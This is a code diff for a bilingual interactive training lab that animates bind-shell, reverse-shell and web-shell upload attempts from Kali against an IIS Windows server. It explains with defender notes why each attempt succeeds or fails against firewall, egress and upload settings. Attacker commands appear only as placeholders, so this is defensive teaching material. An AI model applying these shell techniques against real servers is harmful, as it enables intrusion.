+    r.vic = T('Una subida rechazada en el log de la aplicación: un intento fallido que conviene alertar.', 'A rejected upload in the application log: a failed attempt worth alerting on.');
+    r.tip = T('Cortaste la cadena en el primer eslabón: ningún archivo ejecutable llega al disco.', 'You cut the chain at the first link: no executable file reaches the disk.');
+    return r;
+  }
+  const ex = c.exec === 'on';
+  push('exec', ex, T('IIS: ¿ejecuta scripts en la carpeta de subidas?', 'IIS: does it execute scripts in the uploads folder?'));
+  if (!ex) {
+    r.fail = 'exec';
+    r.att = T('<code>HTTP 404.3</code>: IIS no tiene un manejador para esa extensión en esa carpeta; no ejecuta nada.', '<code>HTTP 404.3</code>: IIS has no handler for that extension in that folder; nothing runs.');
+    r.vic = T('El archivo SÍ está en disco (Sysmon 11 / FIM lo ven) pero inerte. Hay que alertar y limpiarlo igualmente.', 'The file IS on disk (Sysmon 11 / FIM see it) but inert. You still have to alert and clean it.');
+    r.tip = T('Defensa en profundidad: aunque la validación falle, no ejecutar nada en las subidas lo neutraliza.', 'Defense in depth: even if validation fails, executing nothing in uploads neutralizes it.');
+    return r;
+  }
+  r.ok = true;
+  r.att = T('<code>200 OK</code> con el resultado de la instrucción en el cuerpo de la respuesta.', '<code>200 OK</code> with the instruction’s result in the response body.');
+  r.vic = T('Sysmon 11 (archivo nuevo), peticiones al .aspx en el log de IIS y Sysmon 1: <code>w3wp.exe → cmd.exe</code>. Ni puertos nuevos ni salida a Internet.', 'Sysmon 11 (new file), requests to the .aspx in the IIS log, and Sysmon 1: <code>w3wp.exe → cmd.exe</code>. No new ports and no outbound traffic.');
+  r.tip = T('Observa que el firewall, la regla de entrada y la política de salida <b>no participaron</b>: cámbialos y el resultado no varía.', 'Notice that the firewall, the inbound rule and the egress policy <b>did not take part</b>: change them and the outcome does not.');
+  return r;
+}
+
+/* Lab: builds scene patches and animation for one result. */
+function labScenario(c, r) {
+  const pre = { rows: { A: ROW_A }, openPort: null, egress: c.egress, fwHit: null, fwBlock: false, fwState: null, conn: null, pipe: false, kSock: false, wSock: false, chips: { k1: null, k2: null, w1: null }, hl: [] };
+  const post = {};
+  let anim = [];
+  const pk = (from, label, extra) => Object.assign({ pk: from, lane: 'shell', label }, extra || {});
+  if (c.shell === 'bind') {
+    if (c.inbound !== 'none') pre.openPort = Number(c.inbound);
+    if (c.payload) { pre.rows.B = ROW_PAYLOAD; pre.wSock = true; pre.chips.w1 = { t: 'LISTEN\n:' + c.port, c: 'listen' }; }
+    if (r.fail === 'perim') { anim = [pk('k>w', 'SYN', { stop: 'fw' }), { wait: 350 }, pk('k>w', 'SYN (retx)', { stop: 'fw' })]; post.fwBlock = true; post.fwHit = 'in-deny'; post.chips = { k2: { t: 'timed out', c: 'bad' } }; }
+    else if (r.fail === 'host') { anim = [pk('k>w', 'SYN'), { wait: 350 }, pk('k>w', 'SYN (retx)', { stop: 'win' })]; post.fwHit = 'in4444'; post.chips = { k2: { t: 'timed out', c: 'bad' } }; }
+    else if (r.fail === 'listen') { anim = [pk('k>w', 'SYN'), pk('w>k', 'RST')]; post.fwHit = 'in4444'; post.chips = { k2: { t: 'refused', c: 'bad' } }; }
+    else { anim = [pk('k>w', 'SYN'), pk('w>k', 'SYN-ACK'), pk('k>w', 'ACK'), { pulse: ['C'] }, pk('w>k', 'banner')]; Object.assign(post, { fwHit: 'in4444', conn: { lane: 'shell', label: 'TCP ' + c.port }, rows: { C: ROW_CMD }, pipe: true, chips: { k2: { t: 'ESTABLISHED', c: 'on' }, w1: { t: 'ESTABLISHED\n:' + c.port, c: 'on' } } }); }
+  } else if (c.shell === 'reverse') {
+    if (c.listener) { pre.kSock = true; pre.chips.k1 = { t: 'LISTEN\n0.0.0.0:' + c.lport, c: 'listen' }; }
+    if (c.payload) { pre.rows.B = ROW_PAYLOAD; pre.wSock = true; pre.chips.w1 = { t: 'connect()\n→ :' + c.lport, c: 'syn' }; }
+    if (r.fail === 'payload') { anim = [{ wait: 900 }]; }
+    else if (r.fail === 'egress') { anim = [pk('w>k', 'SYN', { stop: 'fw' }), { wait: 350 }, pk('w>k', 'SYN (retx)', { stop: 'fw' })]; post.fwBlock = true; post.fwHit = 'out-deny'; post.chips = { w1: { t: 'connect()\ntimed out', c: 'bad' } }; }
+    else if (r.fail === 'listen') { anim = [pk('w>k', 'SYN'), pk('k>w', 'RST')]; post.fwHit = 'out'; post.chips = { w1: { t: 'connect()\nrefused', c: 'bad' } }; }
+    else { anim = [pk('w>k', 'SYN'), pk('k>w', 'SYN-ACK'), pk('w>k', 'ACK'), { pulse: ['C'] }, pk('w>k', 'banner')]; Object.assign(post, { fwHit: 'out', conn: { lane: 'shell', label: 'TCP ' + c.lport }, rows: { C: ROW_CMD }, pipe: true, fwState: '10.0.0.20:49734 → 203.0.113.50:' + c.lport + '\nSNAT 198.51.100.10:49734', chips: { k1: null, k2: { t: 'ESTABLISHED', c: 'on' }, w1: { t: 'ESTABLISHED\n:49734', c: 'on' } } }); }
+  } else {
+    const http = (from, label, extra) => Object.assign({ pk: from, lane: 'http', label }, extra || {});
+    const rowB = { t1: 'img_0412.aspx', t2: T('/uploads/ · del atacante', '/uploads/ · attacker’s') };
+    pre.fwHit = 'in80';
+    if (r.fail === 'upload') { anim = [http('k>w', T('POST · archivo', 'POST · file')), { pulse: ['A'] }, http('w>k', 'HTTP 4xx')]; post.hl = ['w']; }
+    else if (r.fail === 'exec') { anim = [http('k>w', T('POST · archivo', 'POST · file')), { pulse: ['A'] }, { set: { rows: { B: rowB } } }, { pulse: ['B'] }, http('w>k', '200 OK'), { wait: 300 }, http('k>w', T('<petición>', '<request>')), { pulse: ['A'] }, http('w>k', '404.3')]; post.rows = { B: rowB }; }
+    else { anim = [http('k>w', T('POST · archivo', 'POST · file')), { pulse: ['A'] }, { set: { rows: { B: rowB } } }, { pulse: ['B'] }, http('w>k', '200 OK'), { wait: 300 }, http('k>w', T('<petición>', '<request>')), { pulse: ['A'] }, { pulse: ['B'] }, { set: { rows: { C: { t1: 'cmd.exe /c …', t2: T('proceso efímero (ms)', 'short-lived process (ms)') } } } }, { pulse: ['C'] }, { wait: 300 }, { set: { rows: { C: null } } }, http('w>k', T('200 + salida', '200 + output'))]; Object.assign(post, { rows: { B: rowB }, conn: { lane: 'http', label: 'HTTPS 443' } }); }
+  }
+  return { pre, post, anim };
+}
+
+/* ============ UI: helpers + animated network scene ============ */
+const $ = (s, r) => (r || document).querySelector(s);
+const $$ = (s, r) => Array.from((r || document).querySelectorAll(s));
+const esc = (s) => String(s).replace(/[&<>"]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
+const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
+const REDUCED = (() => { try { return matchMedia('(prefers-reduced-motion: reduce)').matches; } catch (e) { return false; } })();
+let sceneSeq = 0;
+
+/* Geometry (viewBox units). Sockets sit at y=245 (shell lane), HTTP traffic aims at the IIS row (y=167). */
+const G = { KX: 222, WX: 694, FW1: 578, FW2: 602, lane: { shell: { f: 230, b: 260 }, http: { f: 156, b: 178 } } };
+
+function lines(el, text, x, y0, dy) {
+  /* fills an SVG <text> with <tspan> lines */
+  const parts = String(text).split('\n');
+  el.innerHTML = parts.map((p, i) => '<tspan x="' + x + '" y="' + (y0 + i * dy) + '">' + esc(p) + '</tspan>').join('');
+}
+
+function createScene(root, opts) {
+  opts = opts || {};
+  const uid = 'sc' + (++sceneSeq);
+  let state = BASE_STATE();
+  let token = 0;
+  let speed = 1;
+  let el = {};
+
+  function build() {
+    root.innerHTML = '<svg class="scene" viewBox="0 0 1000 440" role="img" aria-label="' + esc(t(
+      'Diagrama de red: Kali Linux (atacante) a la izquierda, Internet, un firewall perimetral y un Windows Server en la red corporativa a la derecha.',
+      'Network diagram: Kali Linux (attacker) on the left, the Internet, a perimeter firewall and a Windows Server on the corporate network on the right.')) + '">' +
+      '<defs><marker id="' + uid + 'ar" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0L10 5L0 10z" fill="currentColor"/></marker></defs>' +
+      '<rect class="zone-net" x="222" y="50" width="356" height="330" rx="6"/>' +
+      '<rect class="zone-lan" x="602" y="50" width="394" height="330" rx="6"/>' +
+      '<text class="muted" x="400" y="72" text-anchor="middle" font-size="16" font-weight="600">Internet</text>' +
+      '<text class="muted" x="844" y="42" text-anchor="middle" font-size="14" font-weight="600">' + esc(t('Red corporativa · DMZ 10.0.0.0/24', 'Corporate network · DMZ 10.0.0.0/24')) + '</text>' +
+      /* Kali */
+      '<g class="pickable" data-pick="k"><rect class="node k" x="16" y="60" width="200" height="310" rx="12"/>' +
+      '<text x="116" y="94" text-anchor="middle" font-size="20" font-weight="700">Kali Linux</text>' +
+      '<text class="muted" x="116" y="116" text-anchor="middle" font-size="14">' + esc(t('Atacante', 'Attacker')) + '</text>' +
+      '<text class="mono" x="116" y="142" text-anchor="middle" font-size="14">203.0.113.50</text>' +
+      '<rect x="36" y="170" width="160" height="96" rx="6" fill="var(--term-bg)"/>' +
+      '<text class="mono" x="46" y="198" font-size="12" style="fill:var(--t-prompt)">kali@kali:~$ <tspan style="fill:var(--term-fg)">nc …</tspan></text></g>' +
+      /* firewall */
+      '<g class="pickable" data-pick="fw"><rect class="wall" x="578" y="50" width="24" height="330" rx="3"/>' +
+      Array.from({ length: 10 }, (_, i) => '<line class="brick" x1="578" x2="602" y1="' + (82 + i * 32) + '" y2="' + (82 + i * 32) + '"/>').join('') +
+      '<line class="brick" x1="590" x2="590" y1="50" y2="380"/>' +
+      '<text x="590" y="30" text-anchor="middle" font-size="14" font-weight="700">' + esc(t('Firewall perimetral', 'Perimeter firewall')) + '</text>' +
+      '<text class="mono muted" x="590" y="432" text-anchor="middle" font-size="12.5">198.51.100.10 (NAT)</text></g>' +
+      /* windows */
+      '<g class="pickable" data-pick="w"><rect class="node w" x="700" y="60" width="288" height="310" rx="12"/>' +
+      '<text x="844" y="90" text-anchor="middle" font-size="19" font-weight="700">Windows Server 2022</text>' +
+      '<text class="mono muted" x="844" y="112" text-anchor="middle" font-size="13">ACME-SRV01 · 10.0.0.20</text></g>' +
+      row('A', 134, 64) + row('B', 216, 58) + row('C', 304, 52) +
+      '<g class="pipe off"><path d="M790 276V302" marker-end="url(#' + uid + 'ar)" style="color:var(--muted)"/><text x="800" y="294">stdin</text>' +
+      '<path d="M898 302V276" marker-end="url(#' + uid + 'ar)" style="color:var(--muted)"/><text x="906" y="294">stdout/err</text></g>' +
+      /* link, sockets, chips */
+      '<g class="link-g"><path class="link off" d="M222 245H694"/><text class="linklabel off" x="458" y="212" text-anchor="middle"></text></g>' +
+      '<circle class="sock k off" cx="216" cy="245" r="9"/><circle class="sock w off" cx="700" cy="245" r="9"/>' +
+      '<text class="chip k1 mono off" data-base="chip k1 mono" font-size="12" font-weight="600"></text><text class="chip k2 mono off" data-base="chip k2 mono" font-size="12" font-weight="600"></text><text class="chip w1 mono off" data-base="chip w1 mono" font-size="12" font-weight="600" text-anchor="end"></text>' +
+      '<g class="stateTag off"><text class="mono" x="590" y="394" text-anchor="middle" font-size="12" font-weight="600"></text></g>' +
+      '<path class="xmark off" d="M582 232l16 26M598 232l-16 26"/>' +
+      '<g class="fx"></g><g class="pks"></g></svg>';
+    const q = (s) => $(s, root);
+    el = { svg: q('svg'), rows: {}, k: q('.node.k'), w: q('.node.w'), wall: q('.wall'), pipe: q('.pipe'), link: q('.link'), linkLabel: q('.linklabel'), sk: q('.sock.k'), sw: q('.sock.w'), chips: { k1: q('.chip.k1'), k2: q('.chip.k2'), w1: q('.chip.w1') }, tag: q('.stateTag'), x: q('.xmark'), fx: q('.fx'), pks: q('.pks') };
+    ['A', 'B', 'C'].forEach((id) => { el.rows[id] = q('.row[data-r="' + id + '"]'); });
+  }
+  function row(id, y, h) {
+    return '<g class="row off" data-r="' + id + '"><rect x="718" y="' + y + '" width="252" height="' + h + '" rx="8"/>' +
+      '<text class="t1" x="732" y="' + (y + 24) + '" font-size="15" font-weight="700"></text>' +
+      '<text class="t2 mono muted" x="732" y="' + (y + 44) + '" font-size="11.5"></text></g>';
+  }
+  function apply(s) {
+    state = s;
+    el.k.classList.toggle('hl', s.hl.includes('k'));
+    el.w.classList.toggle('hl', s.hl.includes('w'));
+    el.wall.classList.toggle('hl', s.hl.includes('fw'));
+    for (const id of ['A', 'B', 'C']) {
+      const r = s.rows[id], g = el.rows[id];
+      g.classList.toggle('off', !r);
+      if (r) { $('.t1', g).textContent = L(r.t1); $('.t2', g).textContent = L(r.t2); }
+    }
+    el.sk.classList.toggle('off', !s.kSock && !(s.conn && s.conn.lane === 'shell'));
+    el.sw.classList.toggle('off', !s.wSock && !(s.conn && s.conn.lane === 'shell'));
+    el.pipe.classList.toggle('off', !s.pipe);
+    el.x.classList.toggle('off', !s.fwBlock);
+    if (s.conn) {
+      const y = s.conn.lane === 'shell' ? 245 : 167;
+      el.link.setAttribute('d', 'M222 ' + y + 'H' + (s.conn.lane === 'shell' ? 694 : 700));
+      el.link.setAttribute('class', 'link ' + s.conn.lane);
+      el.linkLabel.setAttribute('y', s.conn.lane === 'shell' ? 212 : 140);
+      el.linkLabel.textContent = L(s.conn.label);
+      el.linkLabel.setAttribute('class', 'linklabel');
+    } else { el.link.setAttribute('class', 'link off'); el.linkLabel.setAttribute('class', 'linklabel off'); }
+    const k1 = s.chips.k1, k2 = s.chips.k2, w1 = s.chips.w1;
+    setChip(el.chips.k1, k1, 226, 292);
+    setChip(el.chips.k2, k2, 226, 340);
+    setChip(el.chips.w1, w1, 690, 292);
+    if (s.fwState) { el.tag.classList.remove('off'); lines($('text', el.tag), s.fwState, 590, 396, 14); } else el.tag.classList.add('off');
+  }
+  function setChip(node, c, x, y) {
+    const base = node.dataset.base;
+    if (!c) { node.setAttribute('class', base + ' off'); return; }
+    node.setAttribute('class', base + ' ' + (c.c || ''));
+    lines(node, L(c.t), x, y, 16);
+  }
+  /* ---- animation ---- */
+  function packet(from, lane, label, stop, tk) {
+    const ltr = from === 'k>w';
+    const txt = String(L(label));
+    const w = Math.round(txt.length * 7.4 + 16);
+    const y = G.lane[lane][ltr ? 'f' : 'b'];
+    const g = document.createElementNS('http://www.w3.org/2000/svg', 'g');
+    g.setAttribute('class', 'pk ' + (ltr ? 'k' : 'w'));
+    g.innerHTML = '<rect x="' + (-w / 2) + '" y="-11" width="' + w + '" height="22" rx="6"/><text text-anchor="middle" y="4.5"></text>';
+    $('text', g).textContent = txt;
+    el.pks.appendChild(g);
+    const x0 = ltr ? G.KX + 10 + w / 2 : G.WX - 10 - w / 2;
+    let x1 = ltr ? G.WX - 10 - w / 2 : G.KX + 10 + w / 2;
+    if (stop === 'fw') x1 = ltr ? G.FW1 - 8 - w / 2 : G.FW2 + 8 + w / 2;
+    const dist = Math.abs(x1 - x0);
+    const dur = Math.max(REDUCED ? 120 : 380, (dist / 470) * 1150) / speed;
+    return new Promise((resolve) => {
+      const t0 = performance.now();
+      (function frame(now) {
+        if (tk !== token) { g.remove(); return resolve(false); }
+        const p = Math.min(1, (now - t0) / dur), e = p < .5 ? 2 * p * p : 1 - Math.pow(-2 * p + 2, 2) / 2;
+        g.setAttribute('transform', 'translate(' + (x0 + (x1 - x0) * e) + ',' + y + ')');
+        if (p < 1) return requestAnimationFrame(frame);
+        if (stop) {
+          const bx = ltr ? x1 + w / 2 + 14 : x1 - w / 2 - 14;
+          const m = document.createElementNS('http://www.w3.org/2000/svg', 'path');
+          m.setAttribute('class', 'xmark'); m.setAttribute('d', 'M' + (bx - 8) + ' ' + (y - 11) + 'l16 22M' + (bx + 8) + ' ' + (y - 11) + 'l-16 22');
+          el.fx.appendChild(m);
+          g.style.opacity = .35;
+          setTimeout(() => { g.remove(); }, 900 / speed);
+          setTimeout(() => { m.remove(); }, 1400 / speed);
+        } else g.remove();
+        resolve(true);
+      })(t0);
+    });
+  }
+  function pulse(ids) {
+    const nodes = [];
+    for (const id of ids) {
+      const n = id === 'K' ? el.k : id === 'W' ? el.w : id === 'FW' ? el.wall : el.rows[id];
+      if (n) { n.classList.add(id === 'K' || id === 'W' || id === 'FW' ? 'hl' : 'pulse'); nodes.push([n, id]); }
+    }
+    return () => nodes.forEach(([n, id]) => { if (id === 'K' || id === 'W' || id === 'FW') apply(state); else n.classList.remove('pulse'); });
+  }
+  async function play(items) {
+    const tk = ++token;
+    el.pks.innerHTML = ''; el.fx.innerHTML = '';
+    for (const it of items) {
+      if (tk !== token) return false;
+      if (it.pk) await packet(it.pk, it.lane || 'shell', it.label, it.stop, tk);
+      else if (it.pulse) { const done = pulse(it.pulse); await sleep(400 / speed); done(); }
+      else if (it.wait) await sleep(it.wait / speed);
+      else if (it.set) { apply(mergeState(state, it.set)); await sleep(60); }
+      if (tk !== token) return false;
+    }
+    return tk === token;
+  }
+  build();
+  apply(state);
+  root.addEventListener('click', (e) => { const g = e.target.closest('[data-pick]'); if (g && opts.onPick) opts.onPick(g.dataset.pick); });
+  return {
+    set(s) { token++; el.pks.innerHTML = ''; el.fx.innerHTML = ''; apply(s); },
+    patch(p) { apply(mergeState(state, p)); },
+    get state() { return state; },
+    play,
+    stop() { token++; el.pks.innerHTML = ''; el.fx.innerHTML = ''; },
+    setSpeed(v) { speed = v; },
+    refresh() { const keep = state; build(); apply(keep); },
+  };
+}
+
+/* Firewall rules card (HTML, outside the SVG). */
+function rulesHTML(s) {
+  const rs = fwRules(s).map((r) => '<div class="r ' + r.act + (s.fwHit === r.id || (s.fwHit === 'in443' && r.id === 'in80') ? ' hit' : '') + '"><span>' + r.dir + '</span><b>' + r.act.toUpperCase() + '</b><span>' + esc(r.txt) + '</span></div>').join('');
+  const st = '<div class="r st"><span>STATE</span><span>' + (s.fwState ? esc(s.fwState).replace(/\n/g, ' · ') : '—') + '</span></div>';
+  return '<div class="rules" role="list">' + rs + st + '</div>';
+}
+
+/* ============ UI: terminals and the guided stage controller ============ */
+function lineHTML(l) {
+  switch (l.t) {
+    case 'kc': return '<div class="ln pr">┌──(kali㉿kali)-[~]</div><div class="ln"><span class="pr">└─$ </span><span class="c">' + esc(l.s) + '</span></div>';
+    case 'rp': return '<div class="ln"><span class="pr">' + esc(l.p) + '</span>' + (l.c != null ? ' <span class="c">' + esc(l.c) + '</span>' : '') + '</div>';
+    case 'wc': return '<div class="ln"><span class="pr">C:\\Users\\Administrator&gt;</span> <span class="c">' + esc(l.s) + '</span></div>';
+    case 'lg': return '<div class="ln log"><span class="tag">[' + esc(l.tag) + ']</span> ' + esc(l.s) + '</div>';
+    case 'ns': return netstatLines(l.mode, l.filter).map((x) => '<div class="ln">' + (x === '' ? '&nbsp;' : esc(x)) + '</div>').join('');
+    default: { const s = L(l.s); return '<div class="ln' + (l.cls ? ' ' + l.cls : '') + (l.s && typeof l.s === 'object' ? ' wrap' : '') + '">' + (s === '' ? '&nbsp;' : esc(s)) + '</div>'; }
+  }
+}
+function termBox(kind, title, id) {
+  return '<div class="term" id="' + id + '"><div class="th ' + kind + '"><span>' + title + '</span></div><div class="tb" tabindex="0" role="log"></div></div>';
+}
+function makeTerm(root) {
+  const body = $('.tb', root);
+  const scroll = () => { body.scrollTop = body.scrollHeight; };
+  return {
+    root, body,
+    clear() { body.innerHTML = ''; },
+    add(l) { body.insertAdjacentHTML('beforeend', lineHTML(l)); scroll(); },
+    set(ls) { body.innerHTML = ls.map(lineHTML).join(''); scroll(); },
+    async type(l, alive, speed) {
+      const cmd = l.s != null ? l.s : l.c;
+      body.insertAdjacentHTML('beforeend', lineHTML(Object.assign({}, l, { s: '', c: '' })));
+      const c = body.querySelector('.ln:last-child .c');
+      const per = Math.max(8, Math.min(40, 1100 / Math.max(1, cmd.length))) / speed;
+      for (let n = 1; n <= cmd.length; n++) { if (!alive()) return false; c.textContent = cmd.slice(0, n); scroll(); await sleep(REDUCED ? 0 : per); }
+      return true;
+    },
+    form(promptHTML, onSubmit) {
+      let f = $('form', root);
+      if (f) f.remove();
+      f = document.createElement('form');
+      f.autocomplete = 'off';
+      f.innerHTML = '<span class="pl">' + promptHTML + '</span><input type="text" spellcheck="false" autocapitalize="off" aria-label="' + esc(t('Comando', 'Command')) + '">';
+      root.appendChild(f);
+      const inp = $('input', f), hist = []; let hp = 0;
+      f.addEventListener('submit', (e) => { e.preventDefault(); const v = inp.value; inp.value = ''; if (v.trim()) { hist.push(v); hp = hist.length; } onSubmit(v); });
+      inp.addEventListener('keydown', (e) => {
+        if (e.key === 'ArrowUp' && hist.length) { hp = Math.max(0, hp - 1); inp.value = hist[hp]; e.preventDefault(); }
+        if (e.key === 'ArrowDown') { hp = Math.min(hist.length, hp + 1); inp.value = hist[hp] || ''; e.preventDefault(); }
+        e.stopPropagation();
+      });
+      return { input: inp, form: f, prompt: $('.pl', f) };
+    },
+    noForm() { const f = $('form', root); if (f) f.remove(); },
+  };
+}
+
+const stageMem = {};
+const isEarly = (l) => l.t === 'kc' || (l.t === 'rp' && l.c != null);
+const trimPrompt = (ls) => (ls.length && ls[ls.length - 1].t === 'rp' && ls[ls.length - 1].c == null ? ls.slice(0, -1) : ls);
+
+function mountStage(key, host) {
+  const S = STAGES[key], steps = S.steps, last = steps.length - 1;
+  const mem = (stageMem[key] = stageMem[key] || { idx: 0, ans: {}, skip: {}, visited: {}, done: {} });
+  let speed = 1, auto = false, run = 0, dead = false, autoT = null, cwd = CWD0, closed = false;
+  const tokMap = {};
+  host.innerHTML =
+    '<div class="sec"><div><h2>' + esc(L(S.name)) + '</h2><p class="lead">' + esc(L(S.goal)) + '</p></div>' +
+    '<div class="steps" id="stp" role="tablist"></div>' +
+    '<div class="scene-wrap" id="sc"></div><p class="fine scroll-hint">↔ ' + esc(t('Desliza el diagrama para verlo completo.', 'Swipe the diagram to see all of it.')) + '</p>' +
+    '<div class="ctl"><button class="btn" id="prev">◀ ' + esc(t('Anterior', 'Previous')) + '</button><button class="btn primary" id="play">▶ ' + esc(t('Reproducir', 'Autoplay')) + '</button><button class="btn" id="next">' + esc(t('Siguiente', 'Next')) + ' ▶</button><button class="btn" id="replay">↻ ' + esc(t('Repetir animación', 'Replay animation')) + '</button>' +
+    '<span class="seg" role="group" aria-label="' + esc(t('Velocidad', 'Speed')) + '"><button data-sp="0.5" aria-pressed="false">0.5×</button><button data-sp="1" aria-pressed="true">1×</button><button data-sp="2" aria-pressed="false">2×</button></span><span class="scorebar" id="score"></span></div>' +
+    '<div class="stage"><div class="guide card" id="guide" aria-live="polite"></div>' +
+    '<div class="terms"><div class="card"><h4>' + esc(t('Reglas del firewall perimetral', 'Perimeter firewall rules')) + '</h4><div id="rules" style="margin-top:8px"></div></div>' +
+    termBox('k', 'Kali Linux · ' + esc(t('terminal del atacante', 'attacker terminal')), 'tk') +
+    termBox('w', esc(t('Vista del defensor · ACME-SRV01 y firewall', 'Defender view · ACME-SRV01 and firewall')), 'tw') + '</div></div></div>';
+  const scene = createScene($('#sc', host));
+  const kT = makeTerm($('#tk', host)), wT = makeTerm($('#tw', host));
+  const guide = $('#guide', host);
+  const alive = (tk) => () => !dead && tk === run;
+
+  /* ---------- helpers ---------- */
+  const prevState = (i) => (i > 0 ? foldScene(steps, i - 1) : BASE_STATE());
+  const kLinesTo = (i) => (steps[i] && steps[i].live === 'shell' ? trimPrompt(foldLines(steps, i, 'k')) : foldLines(steps, i, 'k'));
+  function setTerms(i) { kT.set(i < 0 ? [] : kLinesTo(i)); wT.set(i < 0 ? [] : foldLines(steps, i, 'w')); }
+  function setRules(s) { $('#rules', host).innerHTML = rulesHTML(s); }
+  function score() {
+    const keys = Object.keys(mem.ans), ok = keys.filter((k) => mem.ans[k].ok).length;
+    const total = steps.filter((s) => s.predict).length;
+    $('#score', host).textContent = t('Predicciones acertadas: ', 'Predictions correct: ') + ok + '/' + total;
+  }
+  function stepBar() {
+    $('#stp', host).innerHTML = steps.map((s, i) => '<button class="stp' + (i === mem.idx ? ' cur' : mem.visited[i] ? ' done' : '') + '" data-i="' + i + '" role="tab" aria-selected="' + (i === mem.idx) + '" title="' + esc(L(s.title)) + '"><i>' + (mem.visited[i] && i !== mem.idx ? '✓' : i + 1) + '</i><span>' + esc(L(s.title)) + '</span></button>').join('');
+    const cur = $('.stp.cur', host); if (cur && cur.scrollIntoView) { const b = $('#stp', host); b.scrollLeft = cur.offsetLeft - b.clientWidth / 2 + cur.clientWidth / 2; }
+    $('#prev', host).disabled = mem.idx === 0;
+    $('#next', host).disabled = mem.idx === last;
+    $('#play', host).textContent = (auto ? '❚❚ ' + t('Pausar', 'Pause') : '▶ ' + t('Reproducir', 'Autoplay'));
+    score();
+  }
+  const WHO = { k: 'KALI', w: 'WINDOWS', ps: t('PSEUDOCÓDIGO', 'PSEUDOCODE') };
+  function tokHTML(text, tokens, b) {
+    let pos = 0, out = '';
+    tokens.forEach((tk, n) => { const idx = text.indexOf(tk[0], pos); if (idx < 0) return; out += esc(text.slice(pos, idx)) + '<button type="button" class="tok" aria-pressed="false" data-b="' + b + '" data-n="' + n + '">' + esc(tk[0]) + '</button>'; pos = idx + tk[0].length; });
+    return out + esc(text.slice(pos));
+  }
+  function cmdHTML(c, i, ci) {
+    const b = i + '-' + ci;
+    let inner;
+    if (c.tokens) { tokMap[b] = c.tokens; inner = tokHTML(c.text, c.tokens, b); } else inner = esc(L(c.text));
+    return '<div class="cmdblock"><span class="who ' + c.who + '">' + WHO[c.who] + '</span><pre>' + inner + '</pre>' +
+      (c.tokens ? '<div class="tokinfo">' + esc(t('Haz clic en una parte del comando para ver qué hace.', 'Click a part of the command to see what it does.')) + '</div>' : '') + '</div>';
+  }
+  function predictHTML(i) {
+    const p = steps[i].predict, a = mem.ans[i];
+    const opts = p.opts.map((o2, n) => '<button class="opt' + (a ? (n === p.ok ? ' right' : n === a.c ? ' wrong' : '') : '') + '" data-o="' + n + '"' + (a ? ' disabled' : '') + '>' + L(o2) + '</button>').join('');
+    let fb = '';
+    if (a) fb = '<div class="fb"><b>' + (a.ok ? '✔ ' + t('¡Correcto!', 'Correct!') : '✘ ' + t('No exactamente.', 'Not quite.')) + '</b> ' + L(p.why) + '</div>';
+    else if (mem.skip[i]) fb = '<div class="fb">' + L(p.why) + '</div>';
+    return '<div class="predict"><span class="pill k">' + esc(t('Predice antes de ver', 'Predict before you look')) + '</span><p class="q">' + L(p.q) + '</p><div class="opts">' + opts + '</div>' + fb +
+      (a || mem.skip[i] ? '' : '<p style="margin-top:8px"><button class="btn small" id="skipP">' + esc(t('Ver sin responder', 'Show without answering')) + '</button></p>') + '</div>';
+  }
+  function tasksHTML(i) {
+    const st = steps[i], done = (mem.done[key] = mem.done[key] || {});
+    return '<h4>' + esc(t('Ejercicios guiados', 'Guided exercises')) + '</h4><ul class="tasks">' + st.tasks.map((tk, n) =>
+      '<li class="' + (done[n] ? 'done' : '') + '" data-n="' + n + '"><span class="chk">' + (done[n] ? '✓' : '') + '</span><span><button class="try" data-cmd="' + esc(tk.cmd) + '">' + esc(tk.cmd) + '</button> ' + L(tk.q) + '</span></li>').join('') + '</ul>';
+  }
+  function huntHTML() {
+    return '<h4>' + esc(t('Eventos del servidor', 'Server events')) + '</h4><div class="hunt" id="hunt">' + HUNT.map((h, n) =>
+      '<label class="hrow" data-n="' + n + '"><input type="checkbox" data-n="' + n + '"><span><span class="tag">[' + h.tag + ']</span> ' + esc(h.s) + '<span class="why" hidden></span></span></label>').join('') +
+      '</div><p style="margin-top:10px"><button class="btn primary" id="huntGo">' + esc(t('Comprobar mi análisis', 'Check my analysis')) + '</button> <span id="huntRes"></span></p>';
+  }
+  function renderGuide(i, gated) {
+    const st = steps[i];
+    let h = '<div class="hd"><span class="num">' + esc(t('PASO ', 'STEP ')) + (i + 1) + '/' + steps.length + '</span><h3>' + L(st.title) + '</h3></div>';
+    if (st.predict && (gated || mem.ans[i] || mem.skip[i])) h += predictHTML(i);
+    if (!gated) {
+      if (st.what) h += '<p>' + L(st.what) + '</p>';
+      (st.cmd || []).forEach((c, ci) => { h += cmdHTML(c, i, ci); });
+      if (st.why) h += '<details class="why"><summary>' + esc(t('¿Por qué funciona así?', 'Why does it work this way?')) + '</summary><p>' + L(st.why) + '</p></details>';
+      if (st.points) h += '<div class="callout"><h4>' + esc(t('Lo esencial', 'Key points')) + '</h4><ul class="pts">' + st.points.map((p) => '<li>' + L(p) + '</li>').join('') + '</ul></div>';
+      if (st.def) h += '<div class="callout def"><h4>' + esc(t('Mirada del defensor', 'Defender’s view')) + '</h4><p>' + L(st.def) + '</p></div>';
+      if (st.defList) h += '<div class="callout def"><h4>' + esc(t('Cómo se defiende', 'How to defend')) + '</h4><ul class="pts">' + st.defList.map((p) => '<li>' + L(p) + '</li>').join('') + '</ul></div>';
+      if (st.live === 'shell') h += tasksHTML(i);
+      if (st.live === 'hunt') h += huntHTML();
+    }
+    guide.innerHTML = h;
+  }
+
+  /* ---------- running a step ---------- */
+  function finishAuto(tk, i) {
+    if (!auto || dead || tk !== run) return;
+    if (steps[i].live || i >= last) { auto = false; stepBar(); return; }
+    autoT = setTimeout(() => { if (!dead && tk === run) go(i + 1, true); }, 1700 / speed);
+  }
+  function setupLive(i) {
+    const st = steps[i];
+    kT.noForm();
+    if (st.live === 'shell') {
+      cwd = CWD0; closed = false;
+      kT.set(kLinesTo(i));
+      const f = kT.form(esc(cwd) + '&gt;', (v) => liveExec(v, i));
+      kT.root._f = f;
+      setTimeout(() => { if (!dead && f.input.isConnected && !document.activeElement.closest('input')) { try { f.input.focus({ preventScroll: true }); } catch (e) { /* ignore */ } } }, 50);
+    }
+  }
+  async function liveExec(line, i) {
+    if (closed) return;
+    const f = kT.root._f;
+    kT.add(rp(cwd + '>', line));
+    const r = winExec(line, { phase: key, cwd });
